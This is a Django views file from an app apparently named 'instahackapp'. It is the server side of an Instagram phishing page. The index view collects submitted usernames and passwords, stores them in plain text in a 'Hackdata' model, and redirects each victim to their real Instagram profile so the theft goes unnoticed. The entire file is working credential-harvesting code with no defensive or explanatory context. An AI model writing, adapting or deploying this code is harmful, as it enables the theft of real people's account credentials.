# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.shortcuts import render, redirect
from instahackapp.models import Hackdata

# Create your views here.

def index(request):
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')
        if username != "" or password != "":
            data = Hackdata(username=username,password=password)
            data.save()
            return redirect('https://www.instagram.com/{}'.format(username))
        else:
            return redirect('/')
    else:
        return render(request, "index.html")